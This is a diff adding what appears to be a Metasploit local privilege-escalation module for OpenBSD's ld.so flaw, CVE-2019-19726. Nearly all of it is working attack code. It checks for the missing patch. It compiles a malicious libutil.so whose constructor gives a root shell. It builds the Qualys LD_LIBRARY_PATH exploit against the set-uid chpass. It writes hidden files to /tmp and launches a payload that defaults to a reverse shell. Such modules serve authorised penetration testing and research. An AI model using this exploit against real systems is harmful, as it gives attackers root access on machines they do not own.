@@ -1,0 +1,213 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'OpenBSD Dynamic Loader chpass Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a vulnerability in the OpenBSD `ld.so`
+        dynamic loader (CVE-2019-19726).
+
+        The `_dl_getenv()` function fails to reset the `LD_LIBRARY_PATH`
+        environment variable when set with approximately `ARG_MAX` colons.
+
+        This can be abused to load `libutil.so` from an untrusted path,
+        using `LD_LIBRARY_PATH` in combination with the `chpass` set-uid
+        executable, resulting in privileged code execution.
+
+        This module has been tested successfully on:
+
+        OpenBSD 6.1 (amd64); and
+        OpenBSD 6.6 (amd64)
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Qualys', # Discovery and exploit
+          'bcoles'  # Metasploit
+        ],
+      'DisclosureDate' => '2019-12-11',
+      'Platform'       => %w[bsd unix], # OpenBSD
+      'Arch'           => [ARCH_CMD],
+      'SessionTypes'   => ['shell'],
+      'References'     =>
+        [
+          ['CVE', '2019-19726'],
+          ['EDB', '47780'],
+          ['URL', 'https://blog.qualys.com/laws-of-vulnerabilities/2019/12/11/openbsd-local-privilege-escalation-vulnerability-cve-2019-19726'],
+          ['URL', 'https://www.qualys.com/2019/12/11/cve-2019-19726/local-privilege-escalation-openbsd-dynamic-loader.txt'],
+          ['URL', 'https://www.openwall.com/lists/oss-security/2019/12/11/9'],
+          ['URL', 'https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19726/openbsd-dynamic-loader-chpass'],
+          ['URL', 'https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/013_ldso.patch.sig']
+        ],
+      'Targets'        => [['Automatic', {}]],
+      'DefaultOptions' =>
+        {
+          'PAYLOAD'    => 'cmd/unix/reverse',
+          'WfsDelay'   => 10
+        },
+      'DefaultTarget'  => 0))
+    register_options [
+      OptString.new('CHPASS_PATH', [true, 'Path to chpass', '/usr/bin/chpass'])
+    ]
+    register_advanced_options [
+      OptBool.new('ForceExploit', [false, 'Override check result', false]),
+      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
+    ]
+  end
+
+  def base_dir
+    datastore['WritableDir'].to_s
+  end
+
+  def chpass_path
+    datastore['CHPASS_PATH']
+  end
+
+  def upload(path, data)
+    print_status "Writing '#{path}' (#{data.size} bytes) ..."
+    rm_f path
+    write_file path, data
+    register_file_for_cleanup path
+  end
+
+  def is_root?
+    (cmd_exec('id -u').to_s.gsub(/[^\d]/, '') == '0')
+  end
+
+  def libutil_name
+    return unless command_exists? 'readelf'
+    cmd_exec('readelf -a /usr/sbin/pwd_mkdb').to_s.scan(/\[(libutil\.so\.[\d\.]+)\]/).flatten.first
+  end
+
+  def check
+    patches = cmd_exec('syspatch -l').to_s
+    patch = '013_ldso'
+    if patches.include? patch
+      vprint_error "Patch #{patch} has been installed. Target is not vulnerable."
+      return CheckCode::Safe
+    end
+    vprint_good "Patch #{patch} is not present"
+
+    unless command_exists? 'cc'
+      vprint_error 'cc is not installed'
+      return CheckCode::Safe
+    end
+    print_good 'cc is installed'
+
+    CheckCode::Detected
+  end
+
+  def exploit
+    unless check == CheckCode::Detected
+      unless datastore['ForceExploit']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      end
+      print_warning 'Target does not appear to be vulnerable'
+    end
+
+    if is_root?
+      unless datastore['ForceExploit']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      end
+    end
+
+    unless writable? base_dir
+      fail_with Failure::BadConfig, "#{base_dir} is not writable"
+    end
+
+    # Qualys set-uid shared object from https://www.openwall.com/lists/oss-security/2019/12/11/9
+    lib_data = <<-EOF
+#include <paths.h>
+#include <unistd.h>
+
+static void __attribute__ ((constructor)) _init (void) {
+    if (setuid(0) != 0) _exit(__LINE__);
+    if (setgid(0) != 0) _exit(__LINE__);
+    char * const argv[] = { _PATH_KSHELL, "-c", _PATH_KSHELL "; exit 1", NULL };
+    execve(argv[0], argv, NULL);
+    _exit(__LINE__);
+}
+EOF
+
+    libs = []
+    lib = libutil_name
+    if lib
+      libs << lib
+      print_good "Found libutil.so name: #{lib}"
+    else
+      libs << 'libutil.so.12.1'
+      libs << 'libutil.so.13.1'
+      print_warning "Could not determine libutil.so name. Using: #{libs.join(', ')}"
+    end
+
+    lib_src_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}.c"
+    upload lib_src_path, lib_data
+    libs.each do |lib_name|
+      lib_path = "#{base_dir}/#{lib_name}"
+      print_status "Compiling #{lib_path} ..."
+      output = cmd_exec "cc -fpic -shared -s -o #{lib_path} #{lib_src_path} -Wall"
+      register_file_for_cleanup lib_path
+
+      unless output.blank?
+        print_error output
+        fail_with Failure::Unknown, "#{lib_path}.c failed to compile"
+      end
+    end
+
+    # Qualys exploit from https://www.openwall.com/lists/oss-security/2019/12/11/9
+    exploit_data = <<-EOF
+#include <string.h>
+#include <sys/param.h>
+#include <sys/resource.h>
+#include <unistd.h>
+
+int
+main(int argc, char * const * argv)
+{
+    #define LLP "LD_LIBRARY_PATH=."
+    static char llp[ARG_MAX - 128];
+    memset(llp, ':', sizeof(llp)-1);
+    memcpy(llp, LLP, sizeof(LLP)-1);
+    char * const envp[] = { llp, "EDITOR=echo '#' >>", NULL };
+
+    #define DATA (ARG_MAX * sizeof(char *))
+    const struct rlimit data = { DATA, DATA };
+    if (setrlimit(RLIMIT_DATA, &data) != 0) _exit(__LINE__);
+
+    if (argc <= 1) _exit(__LINE__);
+    argv += 1;
+    execve(argv[0], argv, envp);
+    _exit(__LINE__);
+}
+EOF
+
+    exploit_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
+    upload "#{exploit_path}.c", exploit_data
+    print_status "Compiling #{exploit_path} ..."
+    output = cmd_exec "cc -s #{exploit_path}.c -o #{exploit_path} -Wall"
+    register_file_for_cleanup exploit_path
+
+    unless output.blank?
+      print_error output
+      fail_with Failure::Unknown, "#{exploit_path}.c failed to compile"
+    end
+
+    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
+    upload payload_path, "#!/bin/sh\n#{payload.encoded}\n"
+    chmod payload_path
+
+    print_status 'Launching exploit...'
+    output = cmd_exec("cd #{base_dir};echo '#{payload_path}&exit'|#{exploit_path} #{chpass_path}")
+    output.each_line { |line| vprint_status line.chomp }
+  end
+end
